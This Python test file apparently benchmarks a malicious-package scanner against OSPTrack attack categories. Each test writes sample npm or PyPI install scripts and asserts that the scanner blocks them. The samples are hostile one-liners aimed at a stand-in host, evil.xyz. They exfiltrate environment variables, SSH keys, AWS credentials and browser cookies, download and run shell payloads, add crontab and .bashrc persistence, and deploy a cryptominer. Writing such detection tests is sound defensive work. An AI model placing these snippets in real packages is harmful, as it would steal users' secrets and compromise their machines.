"""OSPTrack attack category benchmark.

Based on the OSPTrack dataset (https://zenodo.org/records/14197378) which
categorizes 1,962 malicious packages across 8 dimensions:
- files, sockets, commands, DNS, static patterns, dynamic behavior

This benchmark validates detection across OSPTrack's attack sub-types:
C2 communication, command execution, root shell, data exfiltration,
credential theft, persistence, and cryptomining.

Reference: https://arxiv.org/html/2411.14829v1
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.ast_scanner import ASTScanner
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _s():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


async def _blocked(reg, files, scripts=None, age=24, name="test-pkg"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
        arts.append(p)
    scanner_map = {
        "npm": [IOCScanner(), CooldownScanner(s), MetadataScanner(), StaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
        "pypi": [IOCScanner(), CooldownScanner(s), MetadataScanner(), PyPIStaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
    }
    pkg = PackageInfo(
        name=name,
        version="1.0.0",
        registry=reg,
        publish_date=datetime.now(UTC) - timedelta(hours=age),
        install_scripts=scripts or {},
    )
    results = await ScanPipeline(scanner_map[reg]).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ========================================================================
# OSPTrack Dimension 1: Command Execution
# (Most prevalent in OSPTrack — 73% of malicious samples)
# ========================================================================


async def test_osp_cmd_01_exec_shell_npm():
    """OSPTrack cmd: child_process.exec() with shell command + exfil."""
    assert await _blocked(
        "npm",
        {"s.js": "const{exec}=require('child_process');exec('whoami',(e,o)=>{require('https').get('https://evil.xyz/?d='+o)});"},
        {"postinstall": "node s.js"},
    )


async def test_osp_cmd_02_spawn_npm():
    """OSPTrack cmd: child_process.spawn() with curl."""
    assert await _blocked(
        "npm",
        {"s.js": "const{spawn}=require('child_process');spawn('curl',['https://evil.xyz/payload']);"},
        {"postinstall": "node s.js"},
    )


async def test_osp_cmd_03_subprocess_pypi():
    """OSPTrack cmd: subprocess.Popen in setup.py."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import subprocess;subprocess.Popen(['curl','https://evil.xyz/steal'],stdout=subprocess.DEVNULL)"},
    )


async def test_osp_cmd_04_os_system_pypi():
    """OSPTrack cmd: os.system in setup.py."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os;os.system('curl https://evil.xyz/payload -o /tmp/p && bash /tmp/p')"},
    )


# ========================================================================
# OSPTrack Dimension 2: Socket/Network Communication
# (67% of malicious samples)
# ========================================================================


async def test_osp_net_01_http_get_npm():
    """OSPTrack net: HTTPS GET for exfiltration."""
    assert await _blocked(
        "npm",
        {"s.js": "const https=require('https');https.get('https://evil.xyz/?d='+JSON.stringify(process.env));"},
        {"postinstall": "node s.js"},
    )


async def test_osp_net_02_raw_socket_npm():
    """OSPTrack net: raw TCP socket connection (reverse shell prep)."""
    assert await _blocked(
        "npm",
        {"s.js": "const net=require('net');const{exec}=require('child_process');const c=net.connect(4444,'10.0.0.1');"},
        {"postinstall": "node s.js"},
    )


async def test_osp_net_03_urllib_pypi():
    """OSPTrack net: urllib POST with env data."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os,urllib.request;urllib.request.urlopen('https://evil.xyz/?env='+str(os.environ))"},
    )


async def test_osp_net_04_requests_pypi():
    """OSPTrack net: requests library for data exfiltration."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os;import requests;requests.post('https://evil.xyz',json=dict(os.environ))"},
    )


# ========================================================================
# OSPTrack Dimension 3: DNS Activity
# (23% of malicious samples)
# ========================================================================


async def test_osp_dns_01_hex_subdomain():
    """OSPTrack DNS: hex-encoded data as DNS subdomain."""
    assert await _blocked(
        "npm",
        {"s.js": "const dns=require('dns');dns.resolve(Buffer.from(JSON.stringify(process.env)).toString('hex').slice(0,60)+'.evil.xyz','A',()=>{});"},
        {"postinstall": "node s.js"},
    )


async def test_osp_dns_02_python_dns():
    """OSPTrack DNS: Python DNS exfiltration."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import socket;socket.getaddrinfo(hex(hash(str(__import__('os').environ)))[2:]+'.evil.xyz',80)"},
    )


# ========================================================================
# OSPTrack Dimension 4: File System Access
# (58% of malicious samples)
# ========================================================================


async def test_osp_fs_01_ssh_keys():
    """OSPTrack fs: SSH key file reading."""
    assert await _blocked(
        "npm",
        {"s.js": "const fs=require('fs');const k=fs.readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+k);"},
        {"postinstall": "node s.js"},
    )


async def test_osp_fs_02_aws_creds():
    """OSPTrack fs: AWS credential file access."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import os;data=open(os.path.expanduser('~/.aws/credentials')).read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"},
    )


async def test_osp_fs_03_etc_passwd():
    """OSPTrack fs: /etc/passwd reading."""
    assert await _blocked(
        "pypi",
        {"setup.py": "data=open('/etc/passwd').read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"},
    )


async def test_osp_fs_04_browser_data():
    """OSPTrack fs: browser data theft (cookies, passwords)."""
    assert await _blocked(
        "npm",
        {"s.js": "const fs=require('fs');const data=fs.readFileSync(require('os').homedir()+'/.config/google-chrome/Default/Cookies');fetch('https://evil.xyz/?d='+data.toString('base64'));"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# OSPTrack Dimension 5: Obfuscation
# (41% of malicious samples)
# ========================================================================


async def test_osp_obf_01_base64_exec():
    """OSPTrack obf: base64 decode + exec."""
    assert await _blocked(
        "pypi",
        {"setup.py": "import base64;exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk=').decode())"},
    )


async def test_osp_obf_02_charcode():
    """OSPTrack obf: String.fromCharCode construction."""
    assert await _blocked(
        "npm",
        {"s.js": "eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\"child_process\").exec(\"id\")');"},
        {"postinstall": "node s.js"},
    )


async def test_osp_obf_03_hex_encoded():
    """OSPTrack obf: hex-encoded payload."""
    assert await _blocked(
        "npm",
        {"s.js": "eval('\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x28\\x22\\x63\\x68\\x69\\x6c\\x64');"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# OSPTrack Dimension 6: Persistence
# (12% of malicious samples)
# ========================================================================


async def test_osp_persist_01_crontab():
    """OSPTrack persist: crontab injection."""
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').exec('(crontab -l; echo \"*/5 * * * * curl evil.xyz|bash\") | crontab -');"},
        {"postinstall": "node s.js"},
    )


async def test_osp_persist_02_bashrc():
    """OSPTrack persist: .bashrc modification."""
    assert await _blocked(
        "npm",
        {"s.js": "require('fs').appendFileSync(require('os').homedir()+'/.bashrc','\\ncurl evil.xyz|bash\\n');"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# OSPTrack Dimension 7: Cryptomining
# (5% of malicious samples)
# ========================================================================


async def test_osp_crypto_01_xmrig():
    """OSPTrack crypto: XMRig miner deployment."""
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').exec('curl https://evil.xyz/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig --url stratum+tcp://pool.minexmr.com:4444');"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# Summary
# ========================================================================

_RESULTS = {}


async def test_osptrack_benchmark_summary():
    """OSPTrack benchmark: overall detection rate across all dimensions."""
    tests = {
        # Commands (4)
        "cmd-exec-shell-npm": test_osp_cmd_01_exec_shell_npm,
        "cmd-spawn-npm": test_osp_cmd_02_spawn_npm,
        "cmd-subprocess-pypi": test_osp_cmd_03_subprocess_pypi,
        "cmd-os-system-pypi": test_osp_cmd_04_os_system_pypi,
        # Network (4)
        "net-http-get-npm": test_osp_net_01_http_get_npm,
        "net-raw-socket-npm": test_osp_net_02_raw_socket_npm,
        "net-urllib-pypi": test_osp_net_03_urllib_pypi,
        "net-requests-pypi": test_osp_net_04_requests_pypi,
        # DNS (2)
        "dns-hex-subdomain": test_osp_dns_01_hex_subdomain,
        "dns-python": test_osp_dns_02_python_dns,
        # File system (4)
        "fs-ssh-keys": test_osp_fs_01_ssh_keys,
        "fs-aws-creds": test_osp_fs_02_aws_creds,
        "fs-etc-passwd": test_osp_fs_03_etc_passwd,
        "fs-browser-data": test_osp_fs_04_browser_data,
        # Obfuscation (3)
        "obf-base64-exec": test_osp_obf_01_base64_exec,
        "obf-charcode": test_osp_obf_02_charcode,
        "obf-hex-encoded": test_osp_obf_03_hex_encoded,
        # Persistence (2)
        "persist-crontab": test_osp_persist_01_crontab,
        "persist-bashrc": test_osp_persist_02_bashrc,
        # Cryptomining (1)
        "crypto-xmrig": test_osp_crypto_01_xmrig,
    }
    passed = 0
    total = len(tests)
    for name, test_fn in tests.items():
        try:
            await test_fn()
            passed += 1
            _RESULTS[name] = "PASS"
        except AssertionError:
            _RESULTS[name] = "FAIL"

    rate = passed / total * 100
    print(f"\n{'='*60}")
    print(f"OSPTrack benchmark: {passed}/{total} ({rate:.0f}%)")
    print(f"  Commands:    {sum(1 for k,v in _RESULTS.items() if k.startswith('cmd') and v=='PASS')}/4")
    print(f"  Network:     {sum(1 for k,v in _RESULTS.items() if k.startswith('net') and v=='PASS')}/4")
    print(f"  DNS:         {sum(1 for k,v in _RESULTS.items() if k.startswith('dns') and v=='PASS')}/2")
    print(f"  File system: {sum(1 for k,v in _RESULTS.items() if k.startswith('fs') and v=='PASS')}/4")
    print(f"  Obfuscation: {sum(1 for k,v in _RESULTS.items() if k.startswith('obf') and v=='PASS')}/3")
    print(f"  Persistence: {sum(1 for k,v in _RESULTS.items() if k.startswith('persist') and v=='PASS')}/2")
    print(f"  Cryptomining:{sum(1 for k,v in _RESULTS.items() if k.startswith('crypto') and v=='PASS')}/1")
    for name, status in _RESULTS.items():
        if status == "FAIL":
            print(f"  [FAIL] {name}")
    print(f"{'='*60}")
    assert rate >= 90, f"OSPTrack detection rate {rate:.0f}% below 90% target"
